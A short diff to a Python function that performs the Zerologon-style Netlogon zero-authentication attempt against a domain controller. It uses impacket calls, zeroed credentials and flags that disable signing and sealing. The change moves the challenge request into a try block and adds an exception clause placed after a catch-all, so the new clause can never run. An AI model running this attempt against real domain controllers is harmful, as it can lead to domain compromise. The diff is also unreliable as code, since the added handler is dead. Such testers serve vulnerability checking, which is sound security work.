@@ -86,9 +86,10 @@ def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
     # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
     flags = 0x212fffff
 
-    # Send challenge and authentication request.
-    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
     try:
+        # Send challenge and authentication request.
+        nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
+
         server_auth = nrpc.hNetrServerAuthenticate3(
             rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
             target_computer + '\x00', ciphertext, flags
@@ -107,4 +108,6 @@ def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
             # Unexpected error code from DC: {ex.get_error_code()}.
             return None
     except BaseException as ex:
+        return None
+    except ConnectionResetError:
         return None
